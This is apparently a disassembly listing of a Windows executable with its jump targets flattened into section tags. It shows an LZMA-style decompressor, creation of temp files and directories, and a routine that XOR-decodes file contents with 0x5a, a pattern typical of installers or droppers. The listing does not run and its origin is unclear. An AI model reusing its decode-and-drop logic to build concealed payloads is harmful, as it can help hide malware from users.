cmp edi 0x1000000
jae r-xdata
sub_4079ff
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ecx + 0x48 ]
mov eax edx
test edi edi
je r-xdata
pop edi
leave
retn
cmp edi 0x112
jae r-xdata
mov edx [ ecx + 0x24 ]
push ebx
mov ebx [ ecx + 0x14 ]
push esi
mov esi [ ecx + 0x28 ]
mov [ ebp - 0x8 ] esi
mov esi [ ecx + 0x38 ]
sub eax edx
mov [ ebp - 0x4 ] esi
cmp eax edi
mov esi edi
cmovb esi eax
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
add [ ecx + 0x2c ] esi
sub edi esi
mov [ ecx + 0x48 ] edi
test esi esi
je r-xdata
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x2c ]
cmp eax esi
ja r-xdata
pop esi
mov [ ecx + 0x24 ] edx
pop ebx
mov edi [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
mov [ ecx + 0x30 ] eax
cmp edx edi
sbb eax eax
and eax [ ebp - 0x8 ]
sub eax edi
add eax edx
mov al [ eax + ebx ]
mov [ edx + ebx ] al
inc edx
dec esi
jne r-xdata
sub_407a75
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi edx
mov esi ecx
push ebx
mov ecx esi
call sub_406db9
test eax eax
jne r-xdata
mov ecx [ esi + 0xc ]
sub ecx [ esi + 0x2c ]
mov eax edi
sub eax [ esi + 0x24 ]
cmp eax ecx
jbe r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
cmp [ esi + 0x2c ] eax
jb r-xdata
mov edx [ esi + 0x24 ]
add edx ecx
mov edx edi
mov ecx esi
call sub_4079ff
cmp [ esi + 0x24 ] edi
jae r-xdata
mov [ esi + 0x30 ] eax
cmp [ esi + 0x48 ] 0x112
jbe r-xdata
cmp [ esi + 0x18 ] ebx
jae r-xdata
xor eax eax
mov [ esi + 0x48 ] 0x112
cmp [ esi + 0x48 ] 0x112
jb r-xdata
cmp [ esi + 0x30 ] 0x0
mov edx edi
jne r-xdata
sub_407aea
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x14 ] ebx
mov edx ecx
mov [ ebp - 0x10 ] edx
add [ ebp + 0x8 ] ebx
mov [ ebp - 0x8 ] 0x1
mov eax [ edx + 0x10 ]
mov ecx [ edx + 0x8 ]
shl [ ebp - 0x8 ] cl
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x2c ]
dec ecx
and ecx eax
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x34 ]
shl eax 0x4
add eax ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ edx + 0x10 ]
movzx eax [ ecx + eax * 2 ]
mov esi [ edx + 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edi [ edx + 0x1c ]
mov [ ebp - 0x1c ] eax
cmp edi 0x1000000
jae r-xdata
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x1c ]
cmp esi eax
jae r-xdata
cmp ebx ecx
jae r-xdata
mov edx [ ebp - 0xc ]
sub edi eax
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edx * 2 + 0x180 ]
mov [ ebp - 0x1c ] eax
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax [ edx + 0x10 ]
add eax 0xe6c
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ edx + 0x30 ] eax
jne r-xdata
xor eax eax
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x14 ] ebx
and [ ebp - 0xc ] 0x0
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x1c ]
mov [ ebp - 0x18 ] 0x3
cmp esi eax
jae r-xdata
cmp ebx ecx
jae r-xdata
mov ecx [ edx + 0x24 ]
test ecx ecx
jne r-xdata
mov eax [ edx + 0x2c ]
test eax eax
je r-xdata
sub edi eax
sub esi eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + edx * 2 + 0x198 ]
mov [ ebp - 0x1c ] eax
cmp edi 0x1000000
jae r-xdata
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
push 0x2
mov edi eax
pop eax
mov [ ebp - 0x1c ] edx
add ecx 0x664
mov [ ebp - 0x10 ] eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax [ edx + 0x14 ]
push 0x8
movzx edx [ eax + ecx - 0x1 ]
mov eax [ ebp - 0x10 ]
pop ecx
sub cl [ eax ]
xor eax eax
shr edx cl
mov ecx [ ebp - 0x10 ]
inc eax
mov ecx [ ecx + 0x4 ]
shl eax cl
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx ]
dec eax
and eax [ ebp - 0x18 ]
shl eax cl
add edx eax
mov eax [ ebp - 0x8 ]
imul edx edx 0x600
add eax edx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ edx + 0x28 ]
mov eax [ ebp - 0x8 ]
mov ecx edi
shr ecx 0xb
imul ecx eax
cmp esi ecx
jae r-xdata
cmp ebx ecx
jae r-xdata
movzx eax [ ecx ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
cmp edi 0x1000000
jae r-xdata
cmp [ edx + 0x34 ] 0x7
jae r-xdata
mov ecx [ edx + 0x38 ]
cmp [ edx + 0x24 ] ecx
jae r-xdata
mov edx [ ebp + 0x8 ]
xor ecx ecx
inc ecx
mov eax [ ebp - 0x4 ]
sub edi ecx
movzx eax [ eax + edx * 2 + 0x1b0 ]
sub esi ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
cmp edi 0x1000000
jae r-xdata
lea eax [ edx + 0xf ]
mov edx [ ebp - 0x4 ]
shl eax 0x4
add eax [ ebp - 0x8 ]
mov edi ecx
movzx eax [ edx + eax * 2 ]
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
cmp ecx 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
or esi eax
mov eax [ ebp - 0x1c ]
shl edi 0x8
inc ebx
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x14 ]
cmp esi eax
jae r-xdata
cmp ebx edx
jae r-xdata
mov eax [ edx + 0x14 ]
sub eax ecx
add eax [ edx + 0x24 ]
mov ecx [ ebp - 0xc ]
xor edx edx
movzx ecx [ eax + ecx ]
mov eax 0x100
mov [ ebp - 0xc ] eax
inc edx
mov eax [ edx + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x1c ]
cmp esi eax
jae r-xdata
cmp ebx edx
jae r-xdata
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x1c ]
cmp esi eax
jb r-xdata
cmp ebx ecx
jae r-xdata
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x1c ]
cmp esi eax
jae r-xdata
cmp ebx edx
jae r-xdata
sub edi eax
sub esi eax
movzx eax [ ecx + 0x2 ]
mov [ ebp - 0x14 ] eax
cmp edi 0x1000000
jae r-xdata
mov edi eax
mov eax [ ebp - 0x8 ]
shl eax 0x4
add eax 0x4
add eax ecx
push 0x8
mov [ ebp - 0x14 ] eax
pop eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x1c ]
cmp esi eax
jae r-xdata
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub edi eax
sub esi eax
inc ecx
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov edi eax
jmp r-xdata
sub edi eax
sub esi eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + edx * 2 + 0x1c8 ]
cmp edi 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
sub edi eax
sub esi eax
cmp eax 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x14 ]
cmp esi eax
jae r-xdata
cmp ebx edx
jae r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] eax
inc ecx
sub edi eax
sub esi eax
lea edx [ edx * 2 + 0x1 ]
mov edi eax
add edx edx
not ecx
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov [ ebp - 0x14 ] ebx
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
cmp ecx 0x100
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x1c ] 0xc
add ecx 0xa68
mov eax edi
shr eax 0xb
imul eax edx
cmp esi eax
jae r-xdata
cmp ebx ecx
jae r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
cmp ebx edx
jae r-xdata
sub edi eax
sub esi eax
lea eax [ ecx + 0x204 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x10
mov eax 0x100
mov edi eax
mov eax [ ebp - 0x8 ]
shl eax 0x4
add eax 0x104
add eax ecx
push 0x8
mov [ ebp - 0x14 ] eax
pop eax
mov [ ebp - 0xc ] eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x20 ]
cmp esi eax
jae r-xdata
cmp ebx edx
jae r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and eax ecx
mov [ ebp - 0xc ] eax
cmp edx 0x100
jae r-xdata
cmp edi 0x1000000
jae r-xdata
add ecx ecx
movzx eax [ ecx + eax ]
mov [ ebp - 0x1c ] eax
cmp edi 0x1000000
jae r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
pop edi
pop esi
pop ebx
leave
retn
sub edi eax
sub esi eax
inc ecx
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov ebx [ ebp - 0x8 ]
add ecx ecx
mov [ ebp - 0x18 ] ecx
mov ecx eax
and ecx [ ebp - 0x18 ]
lea eax [ ecx + edx ]
add eax [ ebp - 0xc ]
movzx eax [ ebx + eax * 2 ]
mov ebx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
cmp edi 0x1000000
jae r-xdata
cmp ebx [ ebp + 0x8 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
add ecx ecx
movzx eax [ ecx + eax ]
mov [ ebp - 0x20 ] eax
cmp edi 0x1000000
jae r-xdata
mov edx [ ebp - 0xc ]
sub edx eax
add ecx edx
cmp [ ebp - 0x1c ] 0x4
jae r-xdata
mov eax [ ebp - 0x8 ]
cmp ecx eax
jb r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
cmp ecx 0x4
cmovb edx ecx
shl edx 0x7
add eax 0x360
add eax edx
xor edx edx
mov [ ebp - 0x20 ] eax
inc edx
mov eax edi
shr eax 0xb
imul eax ecx
cmp esi eax
jae r-xdata
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub edi eax
sub esi eax
inc edx
mov edi eax
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
sub edx 0x40
cmp edx 0x4
jb r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
cmp edx 0x40
jae r-xdata
mov ecx edx
shr ecx 0x1
dec ecx
cmp edx 0xe
jae r-xdata
add edx edx
movzx ecx [ edx + eax ]
cmp edi 0x1000000
jae r-xdata
sub ecx 0x4
mov eax edx
and eax 0x1
or eax 0x2
shl eax cl
sub eax edx
mov edx [ ebp - 0x4 ]
lea edx [ edx + eax * 2 ]
add edx 0x55e
jmp r-xdata
shr edi 0x1
mov eax esi
sub eax edi
shr eax 0x1f
dec eax
and eax edi
sub esi eax
dec ecx
jne r-xdata
cmp ebx [ ebp + 0x8 ]
jae r-xdata
xor eax eax
inc eax
cmp edi 0x1000000
jae r-xdata
mov edx [ ebp - 0x4 ]
push 0x4
add edx 0x644
pop ecx
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
mov eax edi
shr eax 0xb
imul eax [ ebp - 0x20 ]
cmp esi eax
jae r-xdata
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub edi eax
sub esi eax
mov eax [ ebp - 0x1c ]
inc eax
mov edi eax
mov eax [ ebp - 0x1c ]
jmp r-xdata
movzx eax [ ebx ]
shl esi 0x8
shl edi 0x8
or esi eax
inc ebx
add eax eax
mov [ ebp - 0x1c ] eax
movzx eax [ eax + edx ]
mov [ ebp - 0x20 ] eax
cmp edi 0x1000000
jae r-xdata
dec ecx
jne r-xdata
sub_408099
push ebp
mov ebp esp
push esi
xor esi esi
xor eax eax
inc esi
mov [ ecx + 0x4c ] esi
mov [ ecx + 0x48 ] eax
mov [ ecx + 0x58 ] eax
test edx edx
je r-xdata
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ecx + 0x2c ] eax
mov [ ecx + 0x30 ] eax
mov [ ecx + 0x50 ] esi
pop esi
pop ebp
retn
mov [ ecx + 0x50 ] esi
sub_4080c3
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov edi [ eax ]
and [ eax ] 0x0
mov [ ebp - 0xc ] edx
mov esi ecx
mov [ ebp - 0x8 ] edi
call sub_4079ff
mov edx [ ebp + 0x14 ]
xor ebx ebx
and [ edx ] 0x0
inc ebx
cmp [ esi + 0x48 ] 0x112
je r-xdata
mov ecx [ esi + 0x20 ]
test ecx ecx
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
xor eax eax
test ecx ecx
setne al
mov [ edx ] ebx
mov eax [ ebp - 0xc ]
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x24 ] eax
jb r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax [ esi + 0x48 ]
test eax eax
jne r-xdata
cmp [ esi + 0x58 ] 0x5
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ esi + 0x58 ]
mov [ ebp - 0x10 ] ecx
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx [ esi ]
mov eax 0x300
shl eax cl
add eax 0x736
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x20 ] eax
je r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x3
cmp [ esi + 0x5c ] 0x0
jne r-xdata
mov [ ebp + 0x8 ] ecx
mov [ ebp - 0x8 ] edi
mov al [ ecx ]
mov [ edx + esi + 0x5c ] al
inc [ esi + 0x58 ]
mov eax [ ebp + 0xc ]
inc ecx
inc [ eax ]
dec edi
jne r-xdata
xor edx edx
mov [ ebp - 0x8 ] edx
cmp ecx 0x14
jae r-xdata
cmp edi 0x14
jb r-xdata
mov [ esi + 0x44 ] ebx
mov [ esi + 0x40 ] ebx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x38 ] ebx
and [ esi + 0x34 ] 0x0
and [ esi + 0x50 ] 0x0
mov edi [ esi + 0x10 ]
mov ecx eax
mov eax 0x400
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
mov edi [ ebp - 0x8 ]
xor ebx ebx
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x4
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax ebx
jmp r-xdata
movzx ecx [ esi + 0x5d ]
movzx eax [ esi + 0x5e ]
shl ecx 0x8
or ecx eax
movzx eax [ esi + 0x5f ]
shl ecx 0x8
or ecx eax
movzx eax [ esi + 0x60 ]
or [ esi + 0x1c ] 0xffffffff
and [ esi + 0x4c ] 0x0
shl ecx 0x8
or ecx eax
and [ esi + 0x58 ] 0x0
mov [ esi + 0x20 ] ecx
mov edx [ esi + 0x58 ]
cmp edx 0x5
jae r-xdata
mov [ esi + 0x58 ] ecx
cmp ecx 0x14
jb r-xdata
mov ebx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_407aea
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] ecx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x4 ] ebx
xor eax eax
jmp r-xdata
push ecx
lea edx [ esi + 0x5c ]
mov ecx esi
call sub_407aea
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ebx ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x10 ] ecx
inc ebx
mov al [ edx + ebx ]
mov [ esi + ecx + 0x5c ] al
inc ecx
inc edx
cmp ecx 0x14
jb r-xdata
push edi
push [ ebp + 0x8 ]
lea eax [ esi + 0x5c ]
push eax
call sub_410100
mov eax [ ebp + 0xc ]
add esp 0xc
add [ eax ] edi
mov [ esi + 0x58 ] edi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x14 ]
add ecx edi
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
add [ eax ] ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
lea eax [ esi + 0x5c ]
push eax
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_407a75
test eax eax
jne r-xdata
cmp edx edi
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx eax
cmp eax 0x2
jne r-xdata
mov edx [ ebp - 0xc ]
push ecx
mov ecx esi
mov [ esi + 0x18 ] eax
call sub_407a75
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x18 ]
sub eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
add ecx 0xffffffa4
sub eax esi
add eax ecx
mov ecx [ ebp + 0xc ]
add [ ebp + 0x8 ] eax
add [ ecx ] eax
sub edi eax
and [ esi + 0x58 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ esi + 0x18 ]
mov ecx [ ebp + 0xc ]
sub eax edx
add [ ecx ] eax
add edx eax
mov [ ebp + 0x8 ] edx
sub edi eax
jmp r-xdata
mov edx [ ebp + 0x14 ]
cmp [ esi + 0x48 ] 0x112
mov [ ebp - 0x8 ] edi
jne r-xdata
sub_408356
movzx eax [ edx + 0x3 ]
push esi
movzx esi [ edx + 0x4 ]
shl esi 0x8
or esi eax
movzx eax [ edx + 0x2 ]
shl esi 0x8
or esi eax
movzx eax [ edx + 0x1 ]
shl esi 0x8
or esi eax
mov eax 0x1000
cmp esi eax
cmovb esi eax
mov al [ edx ]
mov [ ecx + 0xc ] esi
cmp al 0xe1
jb r-xdata
movzx eax al
cdq
push 0x9
pop esi
idiv esi
push 0x5
pop esi
movzx eax al
mov [ ecx ] edx
cdq
idiv esi
pop esi
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x4 ] edx
xor eax eax
retn
push 0x4
pop eax
pop esi
retn
sub_4083ac
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ edx + 0x4 ]
add ecx [ edx ]
push edi
mov edi 0x300
shl edi cl
add edi 0x736
cmp [ ebx + 0x10 ] 0x0
je r-xdata
push esi
push [ ebx + 0x10 ]
mov esi [ ebp + 0x8 ]
push esi
call [ esi + 0x4 ]
and [ ebx + 0x10 ] 0x0
lea eax [ edi + edi ]
push eax
push esi
call [ esi ]
add esp 0x10
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x54 ] edi
pop esi
test eax eax
jne r-xdata
cmp edi [ ebx + 0x54 ]
je r-xdata
xor eax eax
push 0x2
pop eax
jmp r-xdata
pop edi
pop ebx
pop ebp
retn
sub_4083ff
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
mov edi ecx
jae r-xdata
lea ecx [ ebp - 0x10 ]
call sub_408356
test eax eax
jne r-xdata
push 0x4
pop eax
jmp r-xdata
pop edi
pop esi
leave
retn
push [ ebp + 0xc ]
mov edx ecx
mov ecx edi
call sub_4083ac
pop ecx
test eax eax
jne r-xdata
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_40843c
push ebp
mov ebp esp
sub esp 0x418
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi 0x208
xor ebx ebx
push edi
lea eax [ ebp - 0x20c ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x418 ] ebx
call sub_414160
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x104
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
push edi
lea eax [ ebp - 0x414 ]
push ebx
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x414 ]
push eax
push ebx
push r--data
lea eax [ ebp - 0x20c ]
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x414 ]
push eax
mov ecx esi
call sub_402085
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_40e09b
leave
retn
sub_4084d3
push 0x434
mov eax sub_41d2b9
call sub_41089b
mov esi ecx
xor eax eax
xor edi edi
push 0x206
mov [ ebp - 0x424 ] ax
lea eax [ ebp - 0x422 ]
push edi
push eax
mov [ ebp - 0x440 ] edi
call sub_414160
add esp 0xc
lea eax [ ebp - 0x424 ]
push 0x104
push eax
push r--data
call [ GetEnvironmentVariableW@IAT ]
push 0x208
lea eax [ ebp - 0x21c ]
push edi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x21c ]
push eax
push edi
push r--data
lea eax [ ebp - 0x424 ]
push eax
call [ GetTempFileNameW@IAT ]
lea eax [ ebp - 0x21c ]
push eax
call [ DeleteFileW@IAT ]
push edi
lea eax [ ebp - 0x21c ]
push eax
call [ CreateDirectoryW@IAT ]
xor eax eax
mov [ ebp - 0x43c ] ax
lea eax [ ebp - 0x21c ]
push eax
lea ecx [ ebp - 0x43c ]
mov [ ebp - 0x428 ] 0x7
mov [ ebp - 0x42c ] edi
call sub_4022ce
push r--data
lea edx [ ebp - 0x43c ]
mov ecx esi
mov [ ebp - 0x4 ] edi
call sub_409419
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x43c ]
call sub_4023e7
mov eax esi
call sub_41084a
retn
sub_4085c2
push ebp
mov ebp esp
mov eax 0x1038
call sub_4132b0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi edx
push ecx
mov edx ecx
lea ecx [ ebp - 0x1038 ]
call sub_4086ea
cmp [ eax + 0x14 ] 0x10
pop ecx
jb r-xdata
push r--data
push eax
call sub_40f22d
pop ecx
pop ecx
lea ecx [ ebp - 0x1038 ]
mov esi eax
call sub_40203c
test esi esi
jne r-xdata
mov eax [ eax ]
push ecx
mov edx edi
lea ecx [ ebp - 0x1020 ]
call sub_4086ea
cmp [ eax + 0x14 ] 0x10
pop ecx
jb r-xdata
xor al al
jmp r-xdata
push r--data
push eax
call sub_40f22d
pop ecx
pop ecx
lea ecx [ ebp - 0x1020 ]
mov edi eax
call sub_40203c
test edi edi
je r-xdata
mov eax [ eax ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40e09b
leave
retn
push 0xfff
lea eax [ ebp - 0x1007 ]
push 0x0
push eax
mov [ ebp - 0x1008 ] 0x0
call sub_414160
add esp 0xc
push esi
call sub_40f242
pop ecx
jmp r-xdata
push esi
test eax eax
je r-xdata
push 0x1000
lea eax [ ebp - 0x1008 ]
push 0x1
push eax
call sub_40eee8
add esp 0x10
xor ecx ecx
test eax eax
jle r-xdata
call sub_40ecae
pop ecx
push edi
call sub_40ecae
pop ecx
mov al 0x1
push edi
push eax
lea eax [ ebp - 0x1008 ]
push 0x1
push eax
call sub_40f0eb
push esi
call sub_40f242
add esp 0x14
mov dl [ ebp + ecx - 0x1008 ]
test dl dl
je r-xdata
inc ecx
cmp ecx eax
jl r-xdata
cmp dl 0x5a
je r-xdata
xor dl 0x5a
mov [ ebp + ecx - 0x1008 ] dl
sub_4086ea
push 0x28
mov eax sub_41d3af
call sub_41089b
mov edi edx
mov esi ecx
mov ecx [ edi + 0x10 ]
xor edx edx
mov [ ebp - 0x34 ] edx
mov [ ebp - 0x30 ] ecx
test ecx ecx
jne r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] edx
mov [ esi ] dl
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax esi
call sub_41084a
retn
xor ecx ecx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x2c ] cl
mov [ ebp - 0x4 ] ecx
test ebx ebx
jne r-xdata
and [ esi + 0x10 ] eax
mov [ esi + 0x14 ] 0xf
mov [ esi ] al
jmp r-xdata
push edx
push edx
push edx
push edx
push ecx
push eax
push edx
push edx
call [ WideCharToMultiByte@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push ecx
push ebx
lea ecx [ ebp - 0x2c ]
call sub_409392
xor ecx ecx
mov [ ebp - 0x1c ] ebx
mov [ ebp + ebx - 0x2c ] cl
jmp r-xdata
push ecx
push ecx
push ebx
push eax
push [ ebp - 0x30 ]
push edi
push ecx
push ecx
call [ WideCharToMultiByte@IAT ]
and [ esi + 0x10 ] 0x0
lea eax [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_4020fe
lea ecx [ ebp - 0x2c ]
call sub_40203c
mov edi [ edi ]
cmp [ ebp - 0x18 ] 0x10
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
cmp [ edi + 0x14 ] 0x8
jb r-xdata
sub_4087bf
push 0x28
mov eax sub_41d382
call sub_41089b
mov edi edx
mov esi ecx
mov ebx [ edi + 0x10 ]
xor ecx ecx
mov [ ebp - 0x34 ] ecx
test ebx ebx
jne r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] ecx
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax esi
call sub_41084a
retn
and [ ebp - 0x1c ] 0x0
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x2c ] cx
and [ ebp - 0x4 ] ecx
push eax
lea ecx [ ebp - 0x2c ]
call sub_40921d
cmp [ ebp - 0x18 ] 0x8
lea eax [ ebp - 0x2c ]
cmovae eax [ ebp - 0x2c ]
cmp [ edi + 0x14 ] 0x10
jb r-xdata
and [ esi + 0x10 ] eax
jmp r-xdata
push ecx
push ecx
push ebx
push eax
push ecx
push ecx
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x30 ] eax
test eax eax
jne r-xdata
push [ ebp - 0x30 ]
push eax
push ebx
push edi
xor ebx ebx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_4020aa
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_4023e7
mov edi [ edi ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi ] ax
jmp r-xdata
sub_40886e
push ebp
mov ebp esp
sub esp 0x22c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov al [ rw-data ]
xor ecx ebp
pop esi
call sub_40e09b
leave
retn
xor eax eax
push 0x206
mov [ ebp - 0x210 ] ax
xor esi esi
lea eax [ ebp - 0x20e ]
push esi
push eax
call sub_414160
add esp 0xc
lea eax [ ebp - 0x210 ]
push 0x104
push eax
push esi
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
push r--data
lea eax [ ebp - 0x210 ]
push eax
call [ PathAppendW@IAT ]
xor eax eax
mov [ ebp - 0x228 ] ax
lea eax [ ebp - 0x210 ]
push eax
lea ecx [ ebp - 0x228 ]
mov [ ebp - 0x214 ] 0x7
mov [ ebp - 0x218 ] esi
call sub_4022ce
cmp [ ebp - 0x214 ] 0x8
lea eax [ ebp - 0x228 ]
cmovae eax [ ebp - 0x228 ]
push eax
call [ GetFileAttributesW@IAT ]
push esi
cmp eax 0xffffffff
push 0x1
lea ecx [ ebp - 0x228 ]
setne [ rw-data ]
call sub_4023e7
sub_408951
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x40
xor ebx ebx
lea eax [ ebp - 0x44 ]
push ebx
push eax
mov edi edx
mov esi ecx
mov [ ebp - 0x48 ] 0x44
call sub_414160
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ ebp - 0x1c ] 0x1
cmp [ eax ] bl
